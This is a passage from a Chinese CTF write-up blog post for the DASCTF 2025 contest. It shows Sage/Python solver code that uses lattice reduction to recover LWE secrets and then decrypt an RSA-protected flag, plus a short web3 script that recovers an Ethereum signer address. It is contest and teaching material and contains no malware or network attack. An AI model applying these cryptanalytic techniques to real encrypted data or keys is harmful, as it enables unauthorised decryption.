&gt; error_bound:<br>            valid = <span class="hljs-literal">False</span><br>        e_reduced.append(e_i)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error out of range! Max abs = <span class="hljs-subst">&#123;<span class="hljs-built_in">max</span>(<span class="hljs-built_in">abs</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> e_reduced)&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 尝试 BKZ</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Trying BKZ...&quot;</span>)<br>        sys.stdout.flush()<br>        <br>        <span class="hljs-keyword">for</span> block_size <span class="hljs-keyword">in</span> [<span class="hljs-number">20</span>, <span class="hljs-number">25</span>, <span class="hljs-number">30</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;  BKZ with block_size=<span class="hljs-subst">&#123;block_size&#125;</span>...&quot;</span>)<br>            sys.stdout.flush()<br>            <br>            L_bkz = L_basis.BKZ(block_size=block_size)<br>            L_gs, _ = L_bkz.gram_schmidt()<br>            <br>            target = vector(QQ, b_int)<br>            closest = vector(ZZ, [<span class="hljs-number">0</span>] * m_cols)<br>            <br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(L_bkz.nrows() - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>                gs_vec = L_gs[i]<br>                coeff = target.dot_product(gs_vec) / gs_vec.dot_product(gs_vec)<br>                coeff_rounded = <span class="hljs-built_in">round</span>(coeff)<br>                target = target - coeff_rounded * vector(QQ, L_bkz[i])<br>                closest = closest + coeff_rounded * L_bkz[i]<br>            <br>            error = b_int - closest<br>            <br>            e_reduced = []<br>            valid = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">for</span> e_i <span class="hljs-keyword">in</span> error:<br>                e_i = <span class="hljs-built_in">int</span>(e_i)<br>                <span class="hljs-keyword">if</span> e_i &gt; p_val // <span class="hljs-number">2</span>:<br>                    e_i -= p_val<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(e_i) &gt; error_bound:<br>                    valid = <span class="hljs-literal">False</span><br>                e_reduced.append(e_i)<br>            <br>            <span class="hljs-keyword">if</span> valid:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Success with BKZ block_size=<span class="hljs-subst">&#123;block_size&#125;</span>!&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error in valid range!&quot;</span>)<br>    <br>    <span class="hljs-comment"># 从 closest = s*M (mod p) 恢复 s</span><br>    <span class="hljs-comment"># closest ≡ s*M (mod p)</span><br>    <br>    closest_mod = vector(GF(p_val), closest)<br>    <br>    <span class="hljs-comment"># 找可逆子矩阵</span><br>    <span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> combinations<br>    <span class="hljs-keyword">for</span> cols <span class="hljs-keyword">in</span> combinations(<span class="hljs-built_in">range</span>(m_cols), n_rows):<br>        M_sub = M.matrix_from_columns(<span class="hljs-built_in">list</span>(cols))<br>        <span class="hljs-keyword">if</span> M_sub.determinant() != <span class="hljs-number">0</span>:<br>            closest_sub = vector(GF(p_val), [closest_mod[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cols])<br>            s_candidate = M_sub.solve_left(closest_sub)<br>            <br>            <span class="hljs-comment"># 验证</span><br>            e_vec = vector(GF(p_val), e_reduced)<br>            computed = s_candidate * M + e_vec<br>            <span class="hljs-keyword">if</span> computed == b:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solution verified!&quot;</span>)<br>                <span class="hljs-keyword">return</span> s_candidate, vector(ZZ, e_reduced)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not recover s&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 解决两个 LWE 问题</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解决 u*(A+B) + e_plus = b_plus&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>sys.stdout.flush()<br><br>u, e_plus = solve_lwe_cvp_correct(AB_plus, b_plus, error_bound=<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">if</span> u <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to find u&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;u found!&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e_plus = <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(e_plus)&#125;</span>&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解决 v*(A-B) + e_minus = b_minus&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>sys.stdout.flush()<br><br>v, e_minus = solve_lwe_cvp_correct(AB_minus, b_minus, error_bound=<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to find v&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;v found!&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e_minus = <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(e_minus)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> u <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;恢复 s1, s2 并解密&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>    <br>    two_inv = GF(p)(<span class="hljs-number">2</span>)^(-<span class="hljs-number">1</span>)<br>    s1 = (u + v) * two_inv<br>    s2 = (u - v) * two_inv<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\ns1 = <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(s1)&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;s2 = <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(s2)&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 验证</span><br>    e1_computed = b1 - s1*A - s2*B<br>    e2_computed = b2 - s2*A - s1*B<br>    <br>    e1_int = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(x) &lt; p//<span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">int</span>(x)-p <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> e1_computed]<br>    e2_int = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(x) &lt; p//<span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-built_in">int</span>(x)-p <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> e2_computed]<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\ne1: <span class="hljs-subst">&#123;e1_int&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e2: <span class="hljs-subst">&#123;e2_int&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(x <span class="hljs-keyword">in</span> [-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> e1_int) <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(x <span class="hljs-keyword">in</span> [-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> e2_int):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n验证成功!&quot;</span>)<br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">vector_to_sha512_hex</span>(<span class="hljs-params">vec</span>):<br>            vector_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> vec)<br>            res = sha512(vector_str.encode()).hexdigest()<br>            res = <span class="hljs-built_in">int</span>(res, <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">return</span> res<br>        <br>        d = vector_to_sha512_hex(s1) + vector_to_sha512_hex(s2)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nd = <span class="hljs-subst">&#123;d&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nRSA 解密...&quot;</span>)<br>        <span class="hljs-keyword">for</span> delta <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>            d_try = d + delta<br>            m_try = <span class="hljs-built_in">pow</span>(c, d_try, N)<br>            flag_bytes = long_to_bytes(m_try)<br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag_bytes) &gt; <span class="hljs-number">5</span>:<br>                <span class="hljs-keyword">if</span> flag_bytes.startswith(<span class="hljs-string">b&#x27;flag&#123;&#x27;</span>) <span class="hljs-keyword">or</span> flag_bytes.startswith(<span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span>) <span class="hljs-keyword">or</span> \<br>                   flag_bytes.startswith(<span class="hljs-string">b&#x27;hgame&#123;&#x27;</span>) <span class="hljs-keyword">or</span> flag_bytes.startswith(<span class="hljs-string">b&#x27;CTF&#123;&#x27;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found with delta = <span class="hljs-subst">&#123;delta&#125;</span>!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;flag_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未找到 flag&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;验证失败&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n完成!&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DigitalSignature"><a href="#DigitalSignature" class="headerlink" title="DigitalSignature"></a>DigitalSignature</h3><p>010打开在图片末尾</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512072048557.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><h3 id="AI画师的小秘密"><a href="#AI画师的小秘密" class="headerlink" title="AI画师的小秘密"></a>AI画师的小秘密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3<br><span class="hljs-keyword">from</span> eth_account.messages <span class="hljs-keyword">import</span> encode_defunct<br><br><span class="hljs-comment"># 原始签名消息</span><br>message = <span class="hljs-string">&quot;Find out the signer. Flag is account address that wrapped by DASCTF&#123;&#125;.&quot;</span><br><span class="hljs-comment"># 编码消息（与签名时的编码方式一致）</span><br>encoded_msg = encode_defunct(text=message)<br><span class="hljs-comment"># 给定的签名结果</span><br>signature = <span class="hljs-string">&quot;0x019c4c2968032373cb8e19f13450e93a1abf8658097405cda5489ea22d3779b57815a7e27498057a8c29bcd38f9678b917a887665c1f0d970761cacdd8c41fb61b&quot;</span><br><br><span class="hljs-comment"># 恢复签名者地址</span><br>signer_address = Web3().eth.account.recover_message(encoded_msg, signature=signature)<br><br><span class="hljs-comment"># 输出flag</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;DASCTF&#123;&#123;<span class="hljs-subst">&#123;signer_address&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF-Writeup/" class="category-chain-item">CTF-Writeup</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>DASCTF下半年赛WriteUp</div>
      <div>https://xu17.top/2025/12/07/DASCTF2025/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>XU17</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年12月7日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              XU17
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/07/01/LZCTF2025-WriteUp/" title="LZCTF2025-WriteUp">
                        <span class="hidden-mobile">LZCTF2025-WriteUp</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <script type="text/javascript">
    Fluid.utils.loadComments('#comments', function() {
      var light = 'github-light';
      var dark = 'github-dark';
      var schema = document.documentElement.getAttribute('data-user-color-scheme');
      if (schema === 'dark') {
        schema = dark;
      } else {
        schema = light;
      }
      window.UtterancesThemeLight = light;
      window.UtterancesThemeDark = dark;
      var s = document.createElement('script');
      s.setAttribute('src', 'https://utteranc.es/client.js');
      s.setAttribute('repo', 'YZS17/comment-utterances');
      s.setAttribute('issue-term', 'pathname');
      
      s.setAttribute('label', 'utterances');
      
      s.setAttribute('theme', schema);
      s.setAttribute('crossorigin', 'anonymous');
      document.getElementById('comments').appendChild(s);
    })
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
